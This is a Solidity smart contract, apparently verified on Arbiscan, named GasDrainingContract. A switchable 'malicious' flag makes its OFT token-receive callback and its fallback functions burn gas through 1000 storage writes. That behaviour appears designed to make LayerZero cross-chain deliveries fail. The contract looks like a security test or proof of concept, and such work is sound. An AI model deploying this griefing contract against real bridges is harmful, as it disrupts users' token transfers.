/**
 *Submitted for verification at Arbiscan.io on 2023-09-29
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract GasDrainingContract {
    bool public malicious;
    mapping(uint256 => uint256) public uselessMap;

    event GasLeft(uint256 gasleft);

    function setMalicious(bool _malicious) public {
        malicious = _malicious;
    }

    /**
     * @dev Called by the OFT contract when tokens are received from source chain.
     * @param _srcChainId The chain id of the source chain.
     * @param _srcAddress The address of the OFT token contract on the source chain.
     * @param _nonce The nonce of the transaction on the source chain.
     * @param _from The address of the account who calls the sendAndCall() on the source chain.
     * @param _amount The amount of tokens to transfer.
     * @param _payload Additional data with no specified format.
     */
    function onOFTReceived(
        uint16 _srcChainId, 
        bytes calldata _srcAddress, 
        uint64 _nonce, 
        bytes32 _from, 
        uint _amount, 
        bytes calldata _payload
    ) external {
        drainGas();
    }

    function tryDrainGas() external {
        drainGas();
    }


    function drainGas() internal {
        if (!malicious) {
            return;
        }

        for (uint256 i = 0; i < 1000; i++) {
            uselessMap[i] = i;
            emit GasLeft(gasleft());
        }
    }

    receive() external payable { drainGas();}

    fallback() external payable {drainGas();}
}